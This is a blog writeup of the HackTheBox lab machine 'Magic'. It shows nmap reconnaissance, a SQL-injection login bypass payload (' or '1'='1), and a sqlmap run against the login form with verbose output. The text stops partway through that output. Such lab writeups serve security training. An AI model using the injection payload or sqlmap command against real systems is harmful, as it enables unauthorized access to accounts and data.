<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Daniel Cano">
<meta name="description" content="Writeup about the Hackthebox retired machine Magic 10.10.10.185">
<meta name="keywords" content="hacking, technology, programming">
<meta name="referrer" content="always">
<meta property="og:description" content="Writeup about the Hackthebox retired machine Magic 10.10.10.185">
<meta property="og:title" content="Writeup Hackthebox HTB Magic">
<meta property="og:url" content="https://u915.net/posts/2020/10/writeup-hackthebox-htb-magic/">
<meta property="og:image" content="https://u915.net/images/logo_small.png" />
<title>Writeup Hackthebox HTB Magic - u915</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
<link rel="icon" href="/images/favicon.png" type="image/x-icon">
<link rel="shortcut icon" href="/images/favicon_48_48.png">
</head>
<body>
<header>
  <div class="blog-header">
    <h1><a href="https://u915.net/">u915</a></h1>
    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merch√°n - Hacking &amp; Tech</h4>
  </div>
  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Writeup Hackthebox HTB Magic</h1>
  </div>
<div class="meta">
  <div class="meta-bar">2020-10-08
  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
      </div>
  </div>
<div class="content">
  <h2 id="0---basic-info">0 - Basic info</h2>
<p>OS: Linux</p>
<p>IP: 10.10.10.185</p>
<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.185
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-02 17:21 CEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.185
Host is up <span style="color:#f92672">(</span>0.041s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Magic Portfolio
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
TCP/IP fingerprint:
OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.80%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>8/2%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>41682%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5F26D9F1
OS:%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>102%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>
OS:O1<span style="color:#f92672">=</span>M54DST11NW7%O2<span style="color:#f92672">=</span>M54DST11NW7%O3<span style="color:#f92672">=</span>M54DNNT11NW7%O4<span style="color:#f92672">=</span>M54DST11NW7%O5<span style="color:#f92672">=</span>M54DST11
OS:NW7%O6<span style="color:#f92672">=</span>M54DST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>
OS:R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M54DNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS
OS:%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>
OS:Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>
OS:R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T
OS:<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>
OS:S<span style="color:#f92672">)</span>

Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 21.68 seconds
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -n -sV --script vuln 10.10.10.185
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-02 17:23 CEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.185
Host is up <span style="color:#f92672">(</span>0.042s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth<span style="color:#f92672">=</span>3; maxpagecount<span style="color:#f92672">=</span>20; withinhost<span style="color:#f92672">=</span>10.10.10.185
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.185:80/login.php
|     Form id: login-form
|_    Form action: 
|_http-dombased-xss: Couldn<span style="color:#e6db74">&#39;t find any DOM based XSS.
</span><span style="color:#e6db74">| http-enum: 
</span><span style="color:#e6db74">|_  /login.php: Possible admin folder
</span><span style="color:#e6db74">| http-fileupload-exploiter: 
</span><span style="color:#e6db74">|   
</span><span style="color:#e6db74">|     Couldn&#39;</span>t find a file-type field.
|   
|_    Couldn<span style="color:#e6db74">&#39;t find a file-type field.
</span><span style="color:#e6db74">| http-internal-ip-disclosure: 
</span><span style="color:#e6db74">|_  Internal IP Leaked: 127.0.1.1
</span><span style="color:#e6db74">|_http-server-header: Apache/2.4.29 (Ubuntu)
</span><span style="color:#e6db74">|_http-stored-xss: Couldn&#39;</span>t find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 39.82 seconds
</code></pre></div><p>The initial recon shows that is vulnerable to some CVEs but nothing useful at first place, i did not check every CVE.</p>
<p>Checking manually the port 80 shows that it is a blog, with a image gallery, interesting technology involved:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/*
Parallelism by HTML5 UP
html5up.net | @ajlkn
Free <span style="color:#66d9ef">for</span> personal and commercial use under the CCA 3.0 license <span style="color:#f92672">(</span>html5up.net/license<span style="color:#f92672">)</span>
*/
</code></pre></div><p>On the corner: Please login, to upload images.</p>
<p>Inside the path <em>/login</em> there is a form, asking for username and password. I tested default credentials like <em>admin/admin</em> , <em>admin/magic</em> but did not work.</p>
<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
<p>The form is vulnerable to SQLi.</p>
<h3 id="manual-check">Manual check</h3>
<p>On the password input text field:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
</code></pre></div><h2 id="3---exploit">3 - Exploit</h2>
<h3 id="sqlmap">SQLmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.185/login.php&#34;</span> --data <span style="color:#e6db74">&#34;username=1&amp;password=2&#34;</span> -p <span style="color:#e6db74">&#34;username,password&#34;</span> --method POST --risk <span style="color:#ae81ff">3</span>
	___
       __H__                                                                                                                                                                                                                               
 ___ ___<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.4.7#stable<span style="color:#f92672">}</span>                                                                                                                                                                                                   
|_ -| . <span style="color:#f92672">[)]</span>     | .<span style="color:#e6db74">&#39;| . |                                                                                                                                                                                                                  
</span><span style="color:#e6db74">|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
</span><span style="color:#e6db74">      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 17:56:42 /2020-08-02/

<span style="color:#f92672">[</span>17:56:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
you have not declared cookie<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, <span style="color:#66d9ef">while</span> server wants to set its own <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;PHPSESSID=0n7mgh94q59...e8b34as73u&#39;</span><span style="color:#f92672">)</span>. Do you want to use those <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
<span style="color:#f92672">[</span>17:56:46<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">if</span> the target URL content is stable
<span style="color:#f92672">[</span>17:56:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> target URL content is stable
<span style="color:#f92672">[</span>17:56:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> heuristic <span style="color:#f92672">(</span>basic<span style="color:#f92672">)</span> test shows that POST parameter <span style="color:#e6db74">&#39;username&#39;</span> might not be injectable
<span style="color:#f92672">[</span>17:56:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">for</span> SQL injection on POST parameter <span style="color:#e6db74">&#39;username&#39;</span>
<span style="color:#f92672">[</span>17:56:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:56:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;OR boolean-based blind - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:56:49<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
<span style="color:#f92672">[</span>17:56:49<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:56:49<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:56:49<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:56:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;PostgreSQL OR error-based - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:56:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;</span>
<span style="color:#f92672">[</span>17:56:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;</span>
<span style="color:#f92672">[</span>17:56:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Oracle OR error-based - WHERE or HAVING clause (XMLType)&#39;</span>
<span style="color:#f92672">[</span>17:56:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:56:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic inline queries&#39;</span>
<span style="color:#f92672">[</span>17:56:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;</span>
<span style="color:#f92672">[</span>17:56:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Microsoft SQL Server/Sybase stacked queries (comment)&#39;</span>
<span style="color:#f92672">[</span>17:56:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;</span>
<span style="color:#f92672">[</span>17:56:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:56:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:56:52<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;</span>
<span style="color:#f92672">[</span>17:56:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;PostgreSQL &gt; 8.1 OR time-based blind&#39;</span>
<span style="color:#f92672">[</span>17:56:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Microsoft SQL Server/Sybase time-based blind (IF)&#39;</span>
<span style="color:#f92672">[</span>17:56:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Oracle AND time-based blind&#39;</span>
<span style="color:#f92672">[</span>17:56:54<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Oracle OR time-based blind&#39;</span>
it is recommended to perform only basic UNION tests <span style="color:#66d9ef">if</span> there is not at least one other <span style="color:#f92672">(</span>potential<span style="color:#f92672">)</span> technique found. Do you want to reduce the number of requests? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> n
<span style="color:#f92672">[</span>17:56:57<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic UNION query (NULL) - 1 to 10 columns&#39;</span>
got a <span style="color:#ae81ff">302</span> redirect to <span style="color:#e6db74">&#39;http://10.10.10.185:80/upload.php&#39;</span>. Do you want to follow? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> N
<span style="color:#f92672">[</span>17:57:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> POST parameter <span style="color:#e6db74">&#39;username&#39;</span> does not seem to be injectable
<span style="color:#f92672">[</span>17:57:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> heuristic <span style="color:#f92672">(</span>basic<span style="color:#f92672">)</span> test shows that POST parameter <span style="color:#e6db74">&#39;password&#39;</span> might not be injectable
<span style="color:#f92672">[</span>17:57:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">for</span> SQL injection on POST parameter <span style="color:#e6db74">&#39;password&#39;</span>
<span style="color:#f92672">[</span>17:57:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:57:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;OR boolean-based blind - WHERE or HAVING clause&#39;</span>
<span style="color:#f92672">[</span>17:57:15<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> POST parameter <span style="color:#e6db74">&#39;password&#39;</span> appears to be <span style="color:#e6db74">&#39;OR boolean-based blind - WHERE or HAVING clause&#39;</span> injectable <span style="color:#f92672">(</span>with --code<span style="color:#f92672">=</span>302<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>17:57:17<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> heuristic <span style="color:#f92672">(</span>extended<span style="color:#f92672">)</span> test shows that the back-end DBMS could be <span style="color:#e6db74">&#39;MySQL&#39;</span> 
it looks like the back-end DBMS is <span style="color:#e6db74">&#39;MySQL&#39;</span>. Do you want to skip test payloads specific <span style="color:#66d9ef">for</span> other DBMSes? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
<span style="color:#66d9ef">for</span> the remaining tests, <span style="color:#66d9ef">do</span> you want to include all tests <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;MySQL&#39;</span> extending provided level <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> value? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
<span style="color:#f92672">[</span>17:57:29<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;</span>
<span style="color:#f92672">[</span>17:57:29<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;</span>
<span style="color:#f92672">[</span>17:57:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#39;</span>
